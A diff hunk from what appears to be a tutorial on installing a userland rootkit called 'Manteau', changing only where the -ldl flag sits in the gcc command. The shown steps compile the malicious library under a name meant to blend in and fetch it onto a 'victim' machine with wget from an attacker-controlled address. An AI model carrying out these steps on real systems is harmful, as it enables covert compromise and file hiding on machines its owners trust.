@@ -471,7 +471,7 @@ With this setup, we can hide arbitrary files from `/bin/ls`.
 ## Actually Using the Damn Rootkit
 Let's actually use this thing. Let's pretend we're root on our victim machine, and it's time to install the malicious library. 
 
-1. Let's set all the definitions specific for the victim host and compile the library. Let's give it a non-descriptive name, something that will blend in to the naked eye. (And let's put "man" in the file name because Manteau). Let's compile our C file with: `gcc -ldl manteau.c -fPIC -shared -D_GNU_SOURCE -o libc.man.so.6`
+1. Let's set all the definitions specific for the victim host and compile the library. Let's give it a non-descriptive name, something that will blend in to the naked eye. (And let's put "man" in the file name because Manteau). Let's compile our C file with: `gcc  manteau.c -fPIC -shared -D_GNU_SOURCE -o libc.man.so.6 -ldl`
 2. Let's `wget` that to the victim, in our case an i386 Ubuntu machine running SSH.
 ```
 root@ubuntu:/home/manteau# wget http://192.168.1.218/libc.man.so.6
